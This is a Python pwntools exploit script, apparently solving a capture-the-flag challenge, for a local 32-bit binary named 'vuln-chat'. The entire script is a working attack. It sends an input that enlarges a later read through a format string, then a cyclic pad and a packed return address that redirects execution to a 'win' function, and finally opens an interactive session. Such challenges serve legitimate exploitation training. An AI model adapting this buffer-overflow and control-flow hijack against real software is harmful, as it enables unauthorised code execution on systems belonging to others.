#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './vuln-chat'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x080485d0
b *0x080485d6
b *0x08048639
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#win = jmp 0x0804856b

io = start()

payload = cyclic(20) + b'%100s\n'

print(io.recvuntil('username: '))

io.send(payload)

print(io.recvuntil(':'))

payload = cyclic(49)
payload += p32(0x0804856b)

io.send(payload + b'\n')

io.interactive()

